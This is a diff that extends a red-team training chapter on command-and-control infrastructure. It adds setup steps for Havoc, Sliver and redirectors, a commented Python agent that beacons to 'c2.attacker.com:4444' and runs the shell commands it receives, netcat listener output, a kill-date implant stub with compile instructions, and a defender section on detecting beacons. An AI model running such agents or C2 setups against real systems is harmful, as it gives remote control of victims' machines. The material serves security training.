@@ -52,6 +52,163 @@ C2 ARCHITECTURE:
 
 ---
 
+## WINDOWS SETUP
+
+This chapter involves running C2 frameworks, building C implants with kill dates, capturing network traffic, and running redirectors. Here is every tool you need and how to get it on Windows 11.
+
+**Tools referenced in this chapter:**
+
+| Tool | Purpose | Where to get it |
+|------|---------|-----------------|
+| Havoc C2 | C2 framework (recommended open-source option) | WSL2 only — see below |
+| Sliver | Go-based C2 framework | WSL2 only — see below |
+| Metasploit Framework | Multi-purpose exploit/C2 framework | WSL2 only — see below |
+| Mythic | Modular C2 framework | WSL2 only (Docker required) |
+| Wireshark | Network packet capture and analysis | Native Windows — see below |
+| socat | TCP port-forwarding for redirectors | WSL2 only |
+| nginx | Reverse proxy for redirectors | WSL2 only |
+| gcc (MinGW-w64) | C compiler for Windows kill-date code | Native Windows — see below |
+| Python 3 | Agent scripting, raw TCP examples | Native Windows |
+
+---
+
+### Step 1 — Install WSL2 (required for all Linux-side tools)
+
+Open PowerShell as Administrator and run:
+
+```powershell
+wsl --install
+# Installs WSL2 with Ubuntu. Requires reboot.
+# After reboot, Ubuntu opens and prompts you to set a username/password.
+```
+
+**Verify WSL2 is working:**
+
+```powershell
+wsl --list --verbose
+# Expected output:
+#   NAME      STATE           VERSION
+# * Ubuntu    Running         2
+```
+
+If VERSION shows 1 instead of 2, run: `wsl --set-version Ubuntu 2`
+
+> **Admin rights required**: `wsl --install` must be run as Administrator.
+
+---
+
+### Step 2 — Install Wireshark (native Windows)
+
+Download from: https://www.wireshark.org/download.html
+
+Run the installer. When prompted, also install **Npcap** (the packet capture driver — required for live capture).
+
+**Verify Wireshark works:**
+
+```powershell
+& "C:\Program Files\Wireshark\tshark.exe" --version
+# Expected: TShark (Wireshark) 4.x.x ...
+```
+
+> **Admin rights required**: Npcap installation requires admin. Live capture also requires admin or being added to the `Npcap Users` group.
+
+---
+
+### Step 3 — Install gcc/MinGW-w64 (to compile C kill-date code on Windows)
+
+The kill date code in Section 5 is C. You need a C compiler. On Windows, use MinGW-w64 via the MSYS2 package manager.
+
+Download MSYS2 from: https://www.msys2.org/
+
+After installing, open the **MSYS2 UCRT64** terminal and run:
+
+```bash
+pacman -S mingw-w64-ucrt-x86_64-gcc
+```
+
+**Verify gcc is installed:**
+
+```bash
+gcc --version
+# Expected: gcc (Rev1, Built by MSYS2 project) 13.x.x ...
+```
+
+To compile C code from PowerShell, add the MinGW bin directory to your PATH:
+
+```powershell
+$env:PATH += ";C:\msys64\ucrt64\bin"
+```
+
+> **Admin rights required**: MSYS2 installation. Not required for compilation itself.
+
+---
+
+### Step 4 — Install C2 frameworks inside WSL2
+
+Open your Ubuntu WSL2 terminal and run these one-time setup commands:
+
+```bash
+# Update package lists
+sudo apt update && sudo apt upgrade -y
+
+# Install build dependencies (needed for Havoc and Sliver)
+sudo apt install -y git build-essential cmake python3 python3-pip mingw-w64 nasm
+
+# Install Go (needed for Sliver and Havoc server components)
+wget https://go.dev/dl/go1.22.0.linux-amd64.tar.gz
+sudo tar -C /usr/local -xzf go1.22.0.linux-amd64.tar.gz
+echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc
+source ~/.bashrc
+
+# Install Havoc C2
+git clone https://github.com/HavocFramework/Havoc.git
+cd Havoc
+sudo apt install -y libssl-dev libz-dev
+make
+# Binary is at: Havoc/teamserver
+
+# Install Sliver
+curl https://sliver.sh/install | sudo bash
+# Binary is at: /usr/local/bin/sliver-server
+
+# Install socat (for redirectors)
+sudo apt install -y socat
+
+# Install nginx (for reverse-proxy redirectors)
+sudo apt install -y nginx
+```
+
+**Verify each tool:**
+
+```bash
+# Verify Havoc compiled:
+ls Havoc/teamserver
+# Expected: the teamserver binary exists (no error)
+
+# Verify Sliver:
+sliver-server version
+# Expected: Sliver C2 Server v1.x.x ...
+
+# Verify socat:
+socat -V
+# Expected: socat by Gerhard Rieger ...
+
+# Verify nginx:
+nginx -v
+# Expected: nginx version: nginx/1.x.x
+```
+
+**Verify Python (for raw TCP beacon example):**
+
+```powershell
+python --version
+# Expected: Python 3.x.x
+```
+
+> **Note on Cobalt Strike**: Cobalt Strike ($5,500/yr commercial) is not covered in setup here. All drill exercises in this chapter use Havoc or Sliver instead, which are free and cover the same concepts.
+
+---
+
 ## Section 1 — C2 Architecture
 
 ### The Four Layers
@@ -283,16 +440,33 @@ Very detectable. Use only in environments with no network monitoring.
 # Minimal raw TCP agent (demonstration concept):
 import socket
 import subprocess
+import time  # needed for time.sleep() at the bottom
 
 while True:
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect(('c2.attacker.com', 4444))
-    cmd = s.recv(1024).decode()
-    output = subprocess.run(cmd, shell=True, capture_output=True, text=True)
-    s.send(output.stdout.encode() + output.stderr.encode())
-    s.close()
-    time.sleep(30)
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # create a TCP socket
+    s.connect(('c2.attacker.com', 4444))                   # connect to listener on port 4444
+    cmd = s.recv(1024).decode()                            # wait for operator to send a command string
+    output = subprocess.run(cmd, shell=True, capture_output=True, text=True)  # run the command in a shell
+    s.send(output.stdout.encode() + output.stderr.encode())  # send stdout + stderr back to operator
+    s.close()                                              # close socket until next beacon cycle
+    time.sleep(30)                                         # sleep 30 seconds before reconnecting
 ```
+
+### Expected Output
+
+**Success looks like**: the listener receives an inbound TCP connection on port 4444. The operator types `whoami`, presses Enter, and sees a username returned within a second or two. Example in netcat:
+
+```
+nc -lvnp 4444
+Listening on 0.0.0.0 4444
+Connection received on 192.168.1.50 54321
+whoami
+desktop-abc\george
+```
+
+**Failure looks like `ConnectionRefusedError: [Errno 111] Connection refused`** — means nothing is listening on port 4444 on the C2 host. Start your listener first before executing the agent.
+
+**Failure looks like no output at all after sending a command** — means `subprocess.run()` ran but returned empty stdout/stderr. The command may have produced no output, or you may have a permission error. Try `echo test` as a baseline command.
 
 This is a Netcat shell. It works. It also triggers every modern EDR
 on port 4444, direct TCP, no encryption. Don't use this in a real operation.
@@ -431,7 +605,7 @@ USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 OPR/107.0.0.0",
 ]
 
-headers = {'User-Agent': random.choice(USER_AGENTS)}
+headers = {'User-Agent': random.choice(USER_AGENTS)}  # pick one at random for this request
 ```
 
 **The problem**: changing User-Agent per request while maintaining a
@@ -638,26 +812,75 @@ terminates and never calls home again. This prevents old implants from
 being used after an operation ends or being caught years later and
 traced back to you.
 
+**Compiler note**: This code uses the Windows API function `ExitProcess()` from
+`kernel32.dll`, and standard C time functions from the C runtime library.
+You must link against both when compiling.
+
+**Compile command (MinGW-w64 on Windows via MSYS2 UCRT64 terminal):**
+
+```bash
+# Compile the kill-date implant stub:
+# -o kill_stub.exe   → output executable name
+# kill_stub.c        → your source file
+# -lkernel32         → link kernel32.dll (provides ExitProcess, Windows API)
+# No special flags needed for time.h — it's part of the C standard library
+gcc -o kill_stub.exe kill_stub.c -lkernel32
+
+# If you want a 64-bit Windows executable (recommended):
+x86_64-w64-mingw32-gcc -o kill_stub.exe kill_stub.c -lkernel32
+```
+
 ```c
-// Kill date check in implant:
-#include <time.h>
+// kill_stub.c — Kill date check in implant
+// Compiler: gcc (MinGW-w64) on Windows, or x86_64-w64-mingw32-gcc in WSL2
+// Link: -lkernel32 (for ExitProcess)
+
+#include <time.h>     // provides: time(), time_t, struct tm, mktime()
+#include <windows.h>  // provides: ExitProcess() from kernel32.dll
 
 void check_kill_date() {
-    time_t now = time(NULL);
-    struct tm kill_date = {0};
-    kill_date.tm_year = 124;  // 2024 (years since 1900)
-    kill_date.tm_mon  = 11;   // December (0-indexed)
-    kill_date.tm_mday = 31;   // 31st
+    time_t now = time(NULL);   // get current UTC time as seconds since epoch
+    struct tm kill_date = {0}; // zero-initialise the struct (all fields = 0)
     
-    time_t kill_time = mktime(&kill_date);
+    kill_date.tm_year = 124;   // years since 1900: 1900 + 124 = 2024
+    kill_date.tm_mon  = 11;    // month index 0-11: 11 = December
+    kill_date.tm_mday = 31;    // day of month: 31st
+    
+    time_t kill_time = mktime(&kill_date); // convert struct tm to epoch seconds
     
     if (now > kill_time) {
-        ExitProcess(0);   // silent termination after kill date
+        // Current time is past the kill date — terminate silently
+        // ExitProcess(0) is from kernel32.dll — link with -lkernel32
+        // exit code 0 looks like a clean normal exit to the OS
+        ExitProcess(0);
     }
 }
 
-// Call this at the start of every beacon loop
+// Call this at the start of every beacon loop:
+// int main() {
+//     while (1) {
+//         check_kill_date();   // die silently if past kill date
+//         // ... beacon logic here ...
+//     }
+// }
 ```
+
+### Expected Output
+
+**Success looks like**: the binary compiles with no output (gcc is silent on success):
+
+```
+$ gcc -o kill_stub.exe kill_stub.c -lkernel32
+$
+```
+
+Run it before the kill date — it exits normally (code 0, no output). Change `tm_year` to a past year (e.g., `100` for year 2000), recompile, run — it exits immediately with no output. That's the correct kill-date behaviour.
+
+**Failure looks like `kill_stub.c:3:10: fatal error: windows.h: No such file or directory`** — means you are not using the MinGW-w64 compiler. Plain Linux gcc does not have Windows headers. Fix: use `x86_64-w64-mingw32-gcc` instead of `gcc`, or install MinGW-w64 via MSYS2.
+
+**Failure looks like `undefined reference to 'ExitProcess'`** — means you forgot `-lkernel32` in your compile command. `ExitProcess` lives in `kernel32.dll` and the linker needs to be told to link it.
+
+**Failure looks like `undefined reference to 'mktime'` or `time`** — rare with MinGW, but if it happens, add `-lmsvcrt` to your compile flags. This links the Microsoft C runtime which provides the standard C time functions.
 
 ### Domain Fronting (Conceptual)
 
@@ -928,6 +1151,28 @@ sudo make
 
 ---
 
+## DEFENDER TAKEAWAY
+
+You just learned how attackers build C2 infrastructure. Here is what to do with that knowledge on Monday morning to harden your own environment.
+
+- **Block outbound DNS to anything except your internal DNS server.** DNS C2 only works if the compromised host can reach an attacker-controlled DNS server. On Windows Firewall, block UDP/TCP port 53 from workstations to all destinations except your internal DNS resolvers. Attackers then lose their DNS C2 channel entirely.
+
+- **Enable DNS query logging and alert on anomalies.** In Windows DNS Server, enable debug logging (DNS Manager → your server → Properties → Debug Logging). Feed logs to your SIEM. Alert on: unusually long subdomain labels (>30 chars), high query rate to a single domain (>50 queries/min), queries to domains registered in the last 30 days. Tools: Windows DNS Analytical log, or forward to Elastic/Splunk and apply beacon-detection rules.
+
+- **Hunt for periodic beacon patterns in your proxy logs.** Export 24 hours of HTTPS proxy logs. Group by source-IP + destination-hostname. Any pair with more than 20 connections and a standard deviation of connection intervals under 15 seconds is a candidate beacon. Free tool: RITA (Real Intelligence Threat Analytics) does this automatically — https://github.com/activecm/rita.
+
+- **Block uncategorised and newly-registered domains at your web proxy.** Every enterprise-grade proxy (Zscaler, Palo Alto, Cisco Umbrella) can block connections to uncategorised URLs and domains registered under 30 days old. Enable both policies. Legitimate business traffic almost never needs to reach a brand-new uncategorised domain. This kills a large portion of C2 infrastructure selection strategies described in this chapter.
+
+- **Windows Event ID 5156 — log outbound connections.** Enable Windows Firewall auditing via Group Policy: Computer Configuration → Windows Settings → Security Settings → Advanced Audit Policy → Object Access → Audit Filtering Platform Connection → Success. Event ID 5156 logs every allowed outbound connection with process name, destination IP, and port. Use this to detect implants making repetitive outbound connections to the same external IP.
+
+- **Windows Event ID 7045 — alert on new service installs.** Persistence often creates services. Every new service installation generates Event ID 7045 in the System log. Alert on any new service whose binary path points to a temp folder (`%TEMP%`, `%APPDATA%`, `C:\Users\*\AppData\`) — that is not normal. Legitimate software installs to `Program Files`.
+
+- **Name-pipe monitoring for SMB C2.** Run Sysmon (free, from Sysinternals) and enable Event ID 17 (Pipe Created) and Event ID 18 (Pipe Connected). Alert on named pipes being created by processes that have no business creating them (e.g., `svchost.exe` creating a pipe named `MSSE-1234-server` or any random alphanumeric string). Legitimate named pipes follow consistent naming conventions.
+
+- **JA3 fingerprint blocking at your firewall/IDS.** Snort, Suricata, and most NGFWs support JA3 hash matching. Import the known-bad JA3 hash list from https://github.com/trisulnsm/trisul-scripts/tree/master/lua/frontend_scripts/reassembly/ja3 and block or alert on matches. This catches default Metasploit and Cobalt Strike traffic even when it uses legitimate-looking URIs.
+
+---
+
 ## Key Terms (Add to Glossary)
 
 | Term | Definition |
@@ -947,6 +1192,9 @@ sudo make
 | **Kill date** | Hardcoded date in implant after which it terminates; limits operational exposure |
 | **Domain categorisation** | Web proxy URL classification; C2 domains must be pre-categorised to avoid block |
 | **BOF** | Beacon Object File; small position-independent code executed in-process by Cobalt Strike/Havoc |
+| **MinGW-w64** | GNU compiler toolchain for Windows; used to compile C implant code on Windows via MSYS2 |
+| **kernel32.dll** | Core Windows DLL providing process/thread/memory APIs including ExitProcess(); always link with -lkernel32 |
+| **ntdll.dll** | Lowest-level Windows DLL exposing native NT syscalls; implicitly linked but used directly for syscall bypasses |
 
 ---
 
@@ -992,6 +1240,7 @@ Your mission:
 6. **Kill date implementation**.
    - Implement a kill date check in a custom C2 stub (sample code provided).
    - Set the kill date to 7 days from now.
+   - Compile with `gcc -o kill_stub.exe kill_stub.c -lkernel32` (MinGW-w64 in MSYS2).
    - Advance the system clock past the kill date.
    - Verify the agent terminates silently.
 
